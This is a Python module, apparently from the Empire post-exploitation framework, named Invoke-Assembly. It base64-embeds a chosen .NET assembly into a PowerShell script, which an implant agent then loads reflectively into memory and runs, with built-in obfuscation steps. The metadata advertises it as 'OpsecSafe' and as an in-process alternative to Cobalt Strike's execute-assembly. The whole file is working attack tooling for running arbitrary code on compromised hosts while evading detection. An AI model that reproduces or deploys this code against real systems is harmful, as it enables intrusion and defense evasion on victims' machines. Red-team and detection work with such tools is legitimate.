from __future__ import print_function

from builtins import str
from builtins import object
from lib.common import helpers
import base64


class Module(object):

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-Assembly',

            'Author': ['@kevin'],

            'Description': "Loads the specified assembly into memory and invokes the main method. "
                           "The Main method and class containing Main must both be PUBLIC for "
                           "Invoke-Assembly to execute it",

            'Software': '',

            'Techniques': ['T1059'],

            'Background': True,

            'OutputExtension': None,

            'NeedsAdmin': False,

            'OpsecSafe': True,

            'Language': 'powershell',

            'MinLanguageVersion': '2',

            'Comments': [
                'Assemblies are loaded with reflection into the current process. This method is',
                'different than Cobalt Strike\'s execute-assembly as it does not create a new process',
                'or inject any code via WriteProcessMemory',
            ]
        }

        self.options = {
            'Agent': {
                'Description': 'Agent to run module on.',
                'Required': True,
                'Value': ''
            },
            'Assembly': {
                'Description': 'Local path to the .NET assembly (.exe). Relative and absolute paths supported.',
                'Required': True,
                'Value': ''
            },
            'Arguments': {
                'Description': 'Any arguments to be passed to the assembly',
                'Required': False,
                'Value': ''
            }
        }

        self.mainMenu = mainMenu

        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        # Helper function for arguments
        def parse_assembly_args(args):
            stringlist = []
            stringbuilder = ""
            inside_quotes = False

            if(not args):
                return('""')
            for ch in args:
                if(ch == " " and not inside_quotes):
                    stringlist.append(stringbuilder) # Add finished string to the list
                    stringbuilder = "" # Reset the string
                elif(ch == '"'):
                    inside_quotes = not inside_quotes
                else: # Ch is a normal character
                    stringbuilder += ch # Add next ch to string

            # Finally...
            stringlist.append(stringbuilder)
            for arg in stringlist:
                if(arg == ""):
                    stringlist.remove(arg)

            argument_string = '","'.join(stringlist)
            # Replace backslashes with a literal backslash so an operator can type a file path like C:\windows\system32 instead of C:\\windows\\system32
            argument_string = argument_string.replace("\\", "\\\\")
            return('"' + argument_string + '"')


        module_source = self.mainMenu.installPath + "/data/module_source/code_execution/Invoke-Assembly.ps1"
        script_end = "\nInvoke-Assembly"

        if obfuscate:
            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscationCommand)
            module_source = module_source.replace("module_source", "obfuscated_module_source")
        try:
            f = open(module_source, 'r')
        except:
            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
            return ""
        module_code = f.read()
        f.close()

        try:
            f = open(self.options['Assembly']['Value'], 'rb')
        except:
            print(helpers.color("[!] Could not read .NET assembly path at: " + str(self.options['Arguments']['Value'])))
            return ""

        assembly_data = f.read()
        f.close()
        module_code = module_code.replace("~~ASSEMBLY~~", base64.b64encode(assembly_data).decode('utf-8'))
        script = module_code

        # Do some parsing on the operator's arguments so it can be formatted for Powershell
        if self.options['Arguments']['Value'] != '':
            assembly_args = parse_assembly_args(self.options['Arguments']['Value'])

        # Add any arguments to the end execution of the script
        if self.options['Arguments']['Value'] != '':
            script_end += " -" + "Arguments" + " " + assembly_args

        if obfuscate:
            script_end = helpers.obfuscate(psScript=script_end, installPath=self.mainMenu.installPath,
                                           obfuscationCommand=obfuscationCommand)
        script += script_end
        script = helpers.keyword_obfuscation(script)

        return script
